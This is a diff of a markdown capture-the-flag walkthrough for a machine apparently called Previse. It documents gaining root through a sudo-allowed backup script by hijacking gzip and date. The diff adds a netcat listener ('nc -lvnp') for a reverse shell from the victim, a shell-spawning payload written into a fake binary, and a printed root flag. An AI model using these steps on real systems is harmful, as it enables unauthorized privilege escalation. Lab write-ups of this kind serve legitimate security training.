@@ -251,7 +251,9 @@ User m4lwhere may run the following commands on previse:
 
 - Only need one to change to pwn the root
 
-- Move to m4lwhere home
+- Move to m4lwhere home, open port to attacker side
+
+### Victim open port
 
 - Gzip approach
 
@@ -271,6 +273,10 @@ User m4lwhere may run the following commands on previse:
 
 > sudo /opt/scripts/[access_backup.sh](./ssh/access_backup.sh)
 
+### Attacker connect
+
+> nc -lvnp *port*
+
 > whoami&&id
 
 ```
@@ -285,7 +291,9 @@ root.txt
 377a03e045513ee63458f3ca5ef64657
 ```
 
-- If use `/bash/bin -p > gzip/date` to run sudo, it will no response at command input
+### Trivial Memo
+
+- If use `echo "/bash/bin -p" > gzip/date` to run sudo, it will no response at command input
 
 *Another approach (not recommand becuz no interactive, and it's temporary root privilege - euid)*
 
